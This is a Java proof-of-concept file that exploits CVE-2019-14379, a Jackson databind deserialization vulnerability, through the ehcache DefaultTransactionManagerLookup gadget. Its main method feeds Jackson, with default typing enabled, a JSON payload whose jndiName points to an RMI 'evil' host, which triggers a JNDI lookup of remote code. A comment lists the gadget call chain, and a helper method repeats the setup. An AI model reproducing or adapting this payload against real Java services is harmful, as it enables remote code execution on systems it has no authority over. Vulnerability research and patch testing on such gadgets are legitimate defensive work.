package com.firebasky.cve;

import com.fasterxml.jackson.databind.ObjectMapper;
import net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup;

import java.io.IOException;
import java.util.Properties;

/**
 * DefaultTransactionManagerLookup.setProperties()
 *     DefaultTransactionManagerLookup.defaultJndiSelector.setJndiName()
 * DefaultTransactionManagerLookup.getTransactionManager()
 *     DefaultTransactionManagerLookup.lookupTransactionManager()
 *         Selector.getTransactionManager()
 *             Selector.doLookup()
 *                 JndiSelector.doLookup()
 *                     InitialContext.lookup()
 */

public class CVE_2019_14379 {
    //jndi
    public static void main(String[] args) throws IOException {
        String json = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\",{\"properties\":{\"jndiName\":\"rmi://127.0.0.1:1088/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用get方法
    }

    public static void test(){
        DefaultTransactionManagerLookup defaultTransactionManagerLookup = new DefaultTransactionManagerLookup();
        Properties properties = new Properties();
        properties.setProperty("jndiName","rmi://127.0.0.1:1099/evil");
        defaultTransactionManagerLookup.setProperties(properties);
        //defaultTransactionManagerLookup.getTransactionManager();
    }
}
